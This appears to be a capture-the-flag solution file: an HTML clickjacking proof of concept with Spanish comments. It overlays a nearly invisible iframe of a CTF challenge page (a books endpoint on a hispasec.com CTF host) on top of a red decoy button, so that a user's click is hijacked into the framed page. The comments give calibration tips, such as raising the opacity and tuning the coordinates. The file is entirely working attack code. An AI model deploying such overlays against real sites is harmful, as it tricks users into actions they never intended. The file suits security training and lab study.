<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking - Paso Final</title>
    <style>
        body { margin: 0; padding: 0; }

        /* Capa de la Víctima (Invisible pero ARRIBA) */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 1000px; /* Ancho fijo para consistencia */
            height: 1200px;
            opacity: 0.05; /* Casi invisible, súbelo a 0.5 para calibrar */
            z-index: 999;  /* Encima para recibir el clic real */
            border: none;
        }

        /* Capa del Atacante (Donde el bot busca el ID) */
        #objetivo {
            position: absolute;
            /* COORDENADAS: Ajusta según tu pantalla FHD */
            top: 910px;    
            left: 50px;
            
            width: 250px;
            height: 60px;
            z-index: 1;    /* Debajo del iframe */
            
            background: red; /* Cámbialo a transparent al final */
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <button id="objetivo">BOTON CEBO</button>

    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>

    <script>
        // Forzamos el scroll al cargar para que el iframe esté en la posición correcta
        window.scrollTo(0, 0);
    </script>
</body>
</html>
